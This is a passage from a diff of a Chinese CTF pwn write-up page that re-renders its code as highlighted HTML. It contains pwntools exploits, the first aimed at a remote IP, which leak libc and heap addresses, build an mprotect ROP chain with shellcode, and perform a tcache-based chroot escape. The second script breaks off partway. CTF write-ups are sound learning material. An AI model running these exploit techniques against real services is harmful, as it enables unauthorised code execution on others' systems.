-sys.setdefaultencoding(&#39;utf-8&#39;)
-from pyDes import *
-from binascii import b2a_hex, a2b_hex
-try:
-from IPython import embed as ipy
-except ImportError:
-print (&#39;IPython not installed.&#39;)
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-context.log_level &#x3D; &#39;info&#39;
-# functions for quick script
-s       &#x3D; lambda data               :ctx.send(str(data))        #in case that data is an int
-sa      &#x3D; lambda delim,data         :ctx.sendafter(str(delim), str(data))
-sl      &#x3D; lambda data               :ctx.sendline(str(data))
-sla     &#x3D; lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
-r       &#x3D; lambda numb&#x3D;4096          :ctx.recv(numb)
-ru      &#x3D; lambda delims, drop&#x3D;True  :ctx.recvuntil(delims, drop)
-irt     &#x3D; lambda                    :ctx.interactive()
-rs      &#x3D; lambda *args, **kwargs    :ctx.start(*args, **kwargs)
-dbg     &#x3D; lambda gs&#x3D;&#39;&#39;, **kwargs    :ctx.debug(gdbscript&#x3D;gs, **kwargs)
-# misc functions
-uu32    &#x3D; lambda data   :u32(data.ljust(4, &#39;\0&#39;))
-uu64    &#x3D; lambda data   :u64(data.ljust(8, &#39;\0&#39;))
-ctx.binary &#x3D; &#39;.&#x2F;pwn&#39;
-ctx.remote &#x3D; (&quot;62.234.32.102&quot;, 10000)
-def add(idx,size):
-sla(&#39;ice&#39;,0)
-sla(&#39;where would you like to put&#39;,idx)
-sla(&#39;how long do your want to input&#39;,size)
+sys.setdefaultencoding(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+<span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex
+<span class="hljs-keyword">try</span>:
+<span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed <span class="hljs-keyword">as</span> ipy
+<span class="hljs-keyword">except</span> ImportError:
+<span class="hljs-keyword">print</span> (<span class="hljs-string">&#x27;IPython not installed.&#x27;</span>)
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]
+context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>
+<span class="hljs-comment"># functions for quick script</span>
+s       = <span class="hljs-keyword">lambda</span> data               :ctx.send(str(data))        <span class="hljs-comment">#in case that data is an int</span>
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data))
+sl      = <span class="hljs-keyword">lambda</span> data               :ctx.sendline(str(data))
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))
+r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :ctx.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :ctx.recvuntil(delims, drop)
+irt     = <span class="hljs-keyword">lambda</span>                    :ctx.interactive()
+rs      = <span class="hljs-keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)
+dbg     = <span class="hljs-keyword">lambda</span> gs=<span class="hljs-string">&#x27;&#x27;</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
+<span class="hljs-comment"># misc functions</span>
+uu32    = <span class="hljs-keyword">lambda</span> data   :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data   :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))
+ctx.binary = <span class="hljs-string">&#x27;./pwn&#x27;</span>
+ctx.remote = (<span class="hljs-string">&quot;62.234.32.102&quot;</span>, <span class="hljs-number">10000</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">0</span>)
+sla(<span class="hljs-string">&#x27;where would you like to put&#x27;</span>,idx)
+sla(<span class="hljs-string">&#x27;how long do your want to input&#x27;</span>,size)
 
-def delete(idx):
-sla(&#39;ice&#39;,1)
-sla(&#39;which one do you want to delete&#39;,idx)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">1</span>)
+sla(<span class="hljs-string">&#x27;which one do you want to delete&#x27;</span>,idx)
 
-def show(idx):
-sla(&#39;ice&#39;,2)
-sla(&#39;which one do you want to show&#39;,idx)
-ru(&#39;is :\n&#39;)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">2</span>)
+sla(<span class="hljs-string">&#x27;which one do you want to show&#x27;</span>,idx)
+ru(<span class="hljs-string">&#x27;is :\n&#x27;</span>)
 
-def edit(idx,content):
-sla(&#39;ice&#39;,3)
-sla(&#39;which one do you want to change&#39;,idx)
-sa(&#39;now you can change your diary&#39;,content)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">3</span>)
+sla(<span class="hljs-string">&#x27;which one do you want to change&#x27;</span>,idx)
+sa(<span class="hljs-string">&#x27;now you can change your diary&#x27;</span>,content)
 
-def change(idx,content):
-sla(&#39;ice&#39;,4)
-sa(&#39;index&#39;,idx)
-sa(&#39;IV&#39;,content)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">idx,content</span>):</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">4</span>)
+sa(<span class="hljs-string">&#x27;index&#x27;</span>,idx)
+sa(<span class="hljs-string">&#x27;IV&#x27;</span>,content)
 
-def read_shellcode():
-ascii &#x3D; &quot;&quot;
-with open(&#39;shellcode&#39;,&#39;r&#39;) as f:
-data &#x3D; f.readlines()
-data &#x3D; data[0]
-data &#x3D; str(data)[1:-2]
-odom &#x3D; data.split(&#39;,&#39;)
-ascii &#x3D; map(int,odom)
-#return ascii
-x86_shellcode &#x3D; &quot;&quot;
-for i in range(len(ascii)):
-x86_shellcode +&#x3D; chr(ascii[i])
-return x86_shellcode
-def decrypto_data(data):
-with open(&#39;cipher&#39;,&#39;w&#39;) as f:
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_shellcode</span>():</span>
+ascii = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
+data = f.readlines()
+data = data[<span class="hljs-number">0</span>]
+data = str(data)[<span class="hljs-number">1</span>:<span class="hljs-number">-2</span>]
+odom = data.split(<span class="hljs-string">&#x27;,&#x27;</span>)
+ascii = map(int,odom)
+<span class="hljs-comment">#return ascii</span>
+x86_shellcode = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ascii)):
+x86_shellcode += chr(ascii[i])
+<span class="hljs-keyword">return</span> x86_shellcode
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto_data</span>(<span class="hljs-params">data</span>):</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;cipher&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
 f.write(data)
-payload &#x3D; &#39;.&#x2F;cbc &#39;
+payload = <span class="hljs-string">&#x27;./cbc &#x27;</span>
 os.system(payload)
-sleep(1)
-cleartext &#x3D; &quot;&quot;
-with open(&#39;plain&#39;,&#39;r&#39;) as f:
-cleartext &#x3D; f.read(8)
-return cleartext
-def lg(s,addr):
-print(&#39;\033[1;31;40m%20s--&gt;0x%x\033[0m&#39;%(s,addr))
+sleep(<span class="hljs-number">1</span>)
+cleartext = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;plain&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
+cleartext = f.read(<span class="hljs-number">8</span>)
+<span class="hljs-keyword">return</span> cleartext
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lg</span>(<span class="hljs-params">s,addr</span>):</span>
+print(<span class="hljs-string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(s,addr))
 
-rs(&#39;remote&#39;)
-KEY &#x3D; &quot;\0\0\0\0\0\0\0\0&quot;
-IV &#x3D; &quot;\0\0\0\0\0\0\0\0&quot;
-k &#x3D; des(KEY, CBC, IV, pad&#x3D;None, padmode&#x3D;PAD_PKCS5)
+rs(<span class="hljs-string">&#x27;remote&#x27;</span>)
+KEY = <span class="hljs-string">&quot;\0\0\0\0\0\0\0\0&quot;</span>
+IV = <span class="hljs-string">&quot;\0\0\0\0\0\0\0\0&quot;</span>
+k = des(KEY, CBC, IV, pad=<span class="hljs-literal">None</span>, padmode=PAD_PKCS5)
 
-ru(&#39;gift :&#39;)
-heap_leak &#x3D; int(r(4),16)
+ru(<span class="hljs-string">&#x27;gift :&#x27;</span>)
+heap_leak = int(r(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)
 
-#leak libc
-add(0,0x38)
-add(1,0x38)
-add(2,0x38)
-add(3,0x38)
-add(4,0x38)
-add(15,0x38)
-change(0x80000000,&#39;\x00&#39;+chr(heap_leak+1)+&#39;\n&#39;)
-edit(15,p64(0xc1)*2+&#39;\n&#39;)
-delete(0)
-add(5,0x38)
-show(1)
-data &#x3D; decrypto_data(r(8))
-libc &#x3D; uu64(data[:6])
-#print hexdump(data)
-libc_base &#x3D; libc - 0x3c4be8
-#dbg()
-print &#39;libc_base &#x3D; &#39; + hex(libc_base)
-#leak stack
-environ &#x3D; libc_base + 0x3c6f38
-print &#39;environ &#x3D; &#39; + hex(environ)
-change(0x80000000,p64(environ)+&#39;\n&#39;)
-#dbg()
-show(15)
-data &#x3D; decrypto_data(r(8))
-stack &#x3D; uu64(data[:6])
-main_ret &#x3D; stack - 0xf0
-print &#39;main_ret : &#39; + hex(main_ret)
-libc_leak_heap &#x3D; libc_base + 0x3c4b80
+<span class="hljs-comment">#leak libc</span>
+add(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">1</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">3</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">4</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">15</span>,<span class="hljs-number">0x38</span>)
+change(<span class="hljs-number">0x80000000</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>+chr(heap_leak+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0xc1</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)
+delete(<span class="hljs-number">0</span>)
+add(<span class="hljs-number">5</span>,<span class="hljs-number">0x38</span>)
+show(<span class="hljs-number">1</span>)
+data = decrypto_data(r(<span class="hljs-number">8</span>))
+libc = uu64(data[:<span class="hljs-number">6</span>])
+<span class="hljs-comment">#print hexdump(data)</span>
+libc_base = libc - <span class="hljs-number">0x3c4be8</span>
+<span class="hljs-comment">#dbg()</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;libc_base = &#x27;</span> + hex(libc_base)
+<span class="hljs-comment">#leak stack</span>
+environ = libc_base + <span class="hljs-number">0x3c6f38</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;environ = &#x27;</span> + hex(environ)
+change(<span class="hljs-number">0x80000000</span>,p64(environ)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+<span class="hljs-comment">#dbg()</span>
+show(<span class="hljs-number">15</span>)
+data = decrypto_data(r(<span class="hljs-number">8</span>))
+stack = uu64(data[:<span class="hljs-number">6</span>])
+main_ret = stack - <span class="hljs-number">0xf0</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;main_ret : &#x27;</span> + hex(main_ret)
+libc_leak_heap = libc_base + <span class="hljs-number">0x3c4b80</span>
 
-#leak heap
-change(0x80000000,p64(libc_leak_heap)+&#39;\n&#39;)
-#dbg()
-show(15)
-data &#x3D; decrypto_data(r(8))
-heap_base &#x3D; uu64(data[:4]) - 0x140
+<span class="hljs-comment">#leak heap</span>
+change(<span class="hljs-number">0x80000000</span>,p64(libc_leak_heap)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+<span class="hljs-comment">#dbg()</span>
+show(<span class="hljs-number">15</span>)
+data = decrypto_data(r(<span class="hljs-number">8</span>))
+heap_base = uu64(data[:<span class="hljs-number">4</span>]) - <span class="hljs-number">0x140</span>
 
-print &#39;heap_base : &#39; + hex(heap_base)
-lg(&#39;heap_base&#39;,heap_base)
-#raw_input()
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;heap_base : &#x27;</span> + hex(heap_base)
+lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
+<span class="hljs-comment">#raw_input()</span>
 
-#get shell
-#dbg()
-edit(4,&#39;.&#x2F;flag&#x2F;asdad&#x2F;wer&#x2F;po&#x2F;tr&#x2F;flag\n&#39;)
-# edit(4, &#39;.&#x2F;flag.txt\n&#39;)
-payload &#x3D; &#39;python shellcode.py &#39;+str(heap_base)
+<span class="hljs-comment">#get shell</span>
+<span class="hljs-comment">#dbg()</span>
+edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;./flag/asdad/wer/po/tr/flag\n&#x27;</span>)
+<span class="hljs-comment"># edit(4, &#x27;./flag.txt\n&#x27;)</span>
+payload = <span class="hljs-string">&#x27;python shellcode.py &#x27;</span>+str(heap_base)
 os.system(payload)
-shellcode &#x3D; read_shellcode()
-pop_rdx &#x3D; libc_base + 0x1b92
-pop_rsi &#x3D; libc_base + 0x202f8
-pop_rdi &#x3D; 0x021112 + libc_base
-mprotect &#x3D; 0x101830 + libc_base
-change(0x80000000,p64(main_ret)+&#39;\n&#39;)
-payload &#x3D; p64(pop_rdi) + p64(heap_base) + p64(pop_rsi)  + p64(0x1000) + p64(pop_rdx) + p64(7) + p64(mprotect)
-edit(15,payload)
-change(0x80000000,p64(main_ret+0x38)+&#39;\n&#39;)
-edit(15,p64(heap_base+0x150)+&#39;\n&#39;)
-#dbg()
-edit(1,shellcode[:0x20]+&#39;\n&#39;)
-change(0x80000000,p64(heap_base+0x170)+&#39;\n&#39;)
-#dbg()
-edit(15,shellcode[0x20:]+&#39;\n&#39;)
-#dbg()
-sla(&#39;ice&#39;,5)
+shellcode = read_shellcode()
+pop_rdx = libc_base + <span class="hljs-number">0x1b92</span>
+pop_rsi = libc_base + <span class="hljs-number">0x202f8</span>
+pop_rdi = <span class="hljs-number">0x021112</span> + libc_base
+mprotect = <span class="hljs-number">0x101830</span> + libc_base
+change(<span class="hljs-number">0x80000000</span>,p64(main_ret)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+payload = p64(pop_rdi) + p64(heap_base) + p64(pop_rsi)  + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)
+edit(<span class="hljs-number">15</span>,payload)
+change(<span class="hljs-number">0x80000000</span>,p64(main_ret+<span class="hljs-number">0x38</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+edit(<span class="hljs-number">15</span>,p64(heap_base+<span class="hljs-number">0x150</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+<span class="hljs-comment">#dbg()</span>
+edit(<span class="hljs-number">1</span>,shellcode[:<span class="hljs-number">0x20</span>]+<span class="hljs-string">&#x27;\n&#x27;</span>)
+change(<span class="hljs-number">0x80000000</span>,p64(heap_base+<span class="hljs-number">0x170</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
+<span class="hljs-comment">#dbg()</span>
+edit(<span class="hljs-number">15</span>,shellcode[<span class="hljs-number">0x20</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)
+<span class="hljs-comment">#dbg()</span>
+sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">5</span>)
 irt()</code></pre>
 
 <p>还有一个点是flag的位置，如果直接执行cat flag拿到的是假flag，需要自己探测flag目录。<br>shellcode，DES_CBC加解密，查找flag的脚本【也可以手动】就不放了 自己尝试。</p>
 <h2 id="jailbreak"><a href="#jailbreak" class="headerlink" title="jailbreak"></a><strong>jailbreak</strong></h2><p>通过off by one实现tcache attack，修改money。从而获得dup的fd，通过劫持tcache结构体（中间可能需要修复tcache_num），劫持__free_hook为setcontext，执行chdir(fd)来实现chroot逃逸。</p>
-<pre><code class="hljs plain"># -*- coding: utf-8 -*-
-import sys
-import os
-from time import *
-from pwn import *
-#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]
-context.log_level &#x3D; b&quot;CRITICAL&quot;
-remote_ip        &#x3D; b&#39;127.0.0.1&#39;
-remote_port      &#x3D; 9999
-binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;jailbreak&quot;
-#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-local_libc_file  &#x3D; b&#39;.&#x2F;libc-2.27.so&#39;
-remote_libc_file &#x3D; b&#39;&#39;
-def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):
-global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file
-elf &#x3D; context.binary
-if (awd or remote) and remote_libc_file !&#x3D; &quot;&quot;:
-lib &#x3D; ELF(remote_libc_file)
-else:
-lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)
-s       &#x3D; lambda data               :sh.send(str(data))
-sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))
-sl      &#x3D; lambda data               :sh.sendline(str(data))
-sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))
-r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)
-ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)
-irt     &#x3D; lambda                    :sh.interactive()
-uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))
-uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))
-ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
-ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
-lg      &#x3D; lambda data               :log.success(data)
-def add(name_size,description_size):
-sla(&quot;Action:&quot;,&quot;B&quot;)
-sla(&quot;Item name size:&quot;,str(name_size))
-sla(&quot;Item description size:&quot;,str(description_size))
-def edit(idx,name,description):
-sla(&quot;Action:&quot;,&quot;M&quot;)
-sla(&quot;idx:&quot;,str(idx))
-if name !&#x3D; &quot;&quot;:
-sla(&quot;Modify name?[y&#x2F;N]&quot;,&quot;y&quot;)
-sa(&quot;new name:&quot;,str(name))
-else:
-sla(&quot;Modify name?[y&#x2F;N]&quot;,&quot;n&quot;)
-if description !&#x3D; &quot;&quot;:
-sla(&quot;Modify description?[y&#x2F;N]&quot;,&quot;y&quot;)
-sa(&quot;new description:&quot;,str(description))
-else:
-sla(&quot;Modify description?[y&#x2F;N]&quot;,&quot;n&quot;)
-def free(idx):
-sla(&quot;Action:&quot;,&quot;S&quot;)
-sla(&quot;idx:&quot;,str(idx))
-def show():
-sla(&quot;Action:&quot;,&quot;W&quot;)
-def backdoor():
-sla(&quot;Action:&quot;,&quot;\xFF&quot;)
-sla(&quot;Action[y&#x2F;N]&quot;,&#39;y&#39;)
-add(0x18,0x18)
-add(0x18,0x18)
-edit(0,&#39;\x11&#39; * 0x18 + &quot;\n&quot;,&#39;\x12&#39; * 0x18 + &quot;\n&quot;)
-free(0)
-add(0x18,0x18)
+<pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#log_level[&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span>
+context.log_level = <span class="hljs-string">b&quot;CRITICAL&quot;</span>
+remote_ip        = <span class="hljs-string">b&#x27;127.0.0.1&#x27;</span>
+remote_port      = <span class="hljs-number">9999</span>
+binary_file      = <span class="hljs-string">&#x27;./%s&#x27;</span> % <span class="hljs-string">&quot;jailbreak&quot;</span>
+<span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span>
+local_libc_file  = <span class="hljs-string">b&#x27;./libc-2.27.so&#x27;</span>
+remote_libc_file = <span class="hljs-string">b&#x27;&#x27;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">sh,remote = False,awd = False,awd_binary_file = <span class="hljs-string">&#x27;&#x27;</span></span>):</span>
+<span class="hljs-keyword">global</span> binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file
+elf = context.binary
+<span class="hljs-keyword">if</span> (awd <span class="hljs-keyword">or</span> remote) <span class="hljs-keyword">and</span> remote_libc_file != <span class="hljs-string">&quot;&quot;</span>:
+lib = ELF(remote_libc_file)
+<span class="hljs-keyword">else</span>:
+lib = elf.libc <span class="hljs-keyword">if</span> local_libc_file == <span class="hljs-string">b&quot;&quot;</span> <span class="hljs-keyword">else</span> ELF(local_libc_file)
+s       = <span class="hljs-keyword">lambda</span> data               :sh.send(str(data))
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(str(delim), str(data))
+sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(str(data))
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(str(delim), str(data))
+r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :sh.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :sh.recvuntil(delims, drop)
+irt     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ru7f    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ruf7    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[<span class="hljs-number">-4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+lg      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">name_size,description_size</span>):</span>
+sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>)
+sla(<span class="hljs-string">&quot;Item name size:&quot;</span>,str(name_size))
+sla(<span class="hljs-string">&quot;Item description size:&quot;</span>,str(description_size))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,name,description</span>):</span>
+sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>)
+sla(<span class="hljs-string">&quot;idx:&quot;</span>,str(idx))
+<span class="hljs-keyword">if</span> name != <span class="hljs-string">&quot;&quot;</span>:
+sla(<span class="hljs-string">&quot;Modify name?[y/N]&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>)
+sa(<span class="hljs-string">&quot;new name:&quot;</span>,str(name))
+<span class="hljs-keyword">else</span>:
+sla(<span class="hljs-string">&quot;Modify name?[y/N]&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>)
+<span class="hljs-keyword">if</span> description != <span class="hljs-string">&quot;&quot;</span>:
+sla(<span class="hljs-string">&quot;Modify description?[y/N]&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>)
+sa(<span class="hljs-string">&quot;new description:&quot;</span>,str(description))
+<span class="hljs-keyword">else</span>:
+sla(<span class="hljs-string">&quot;Modify description?[y/N]&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
+sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>)
+sla(<span class="hljs-string">&quot;idx:&quot;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span>
+sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span>():</span>
+sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;\xFF&quot;</span>)
+sla(<span class="hljs-string">&quot;Action[y/N]&quot;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x11&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\x12&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>)
+free(<span class="hljs-number">0</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
 show()
-ru(&quot;Item name: &quot;)
-heap_base &#x3D; uu64(r(6)) - 0x280
-edit(0,&#39;\x13&#39; * 0x18 + &quot;\n&quot;,&#39;\x14&#39; * 0x18 + p8(0x41))
-free(0)
-add(0x18,0x29)
-free(1)
-edit(0,&#39;\x13&#39; * 0x18 + &quot;\n&quot;, &#39;\x14&#39; * 0x18 + p64(0x21) + p64(heap_base + 0x250 + 0x10) + &quot;\n&quot; )
-free(0)
-add(0x18,0x18)
-add(0x18,0x18)
-edit(1,&#39;\x15&#39; * 0x18 + &quot;\n&quot;,p64(0xcafecafe) + &quot;\n&quot;)
+ru(<span class="hljs-string">&quot;Item name: &quot;</span>)
+heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x280</span>
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x13&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\x14&#x27;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0x41</span>))
+free(<span class="hljs-number">0</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x29</span>)
+free(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x13&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&#x27;\x14&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(heap_base + <span class="hljs-number">0x250</span> + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span> )
+free(<span class="hljs-number">0</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
+add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
+edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\x15&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
 backdoor()
-ru(&quot;secret:&quot;)
-dir_fd &#x3D; int(ru(&quot;\n&quot;).strip(),10)
-add(0x28,0x28)
-add(0x28,0x28)
-edit(2,&#39;\x16&#39; * 0x28 + p8(0x51),&quot;\n&quot;)
-free(2)
-add(0x28,0x48)
-free(3)
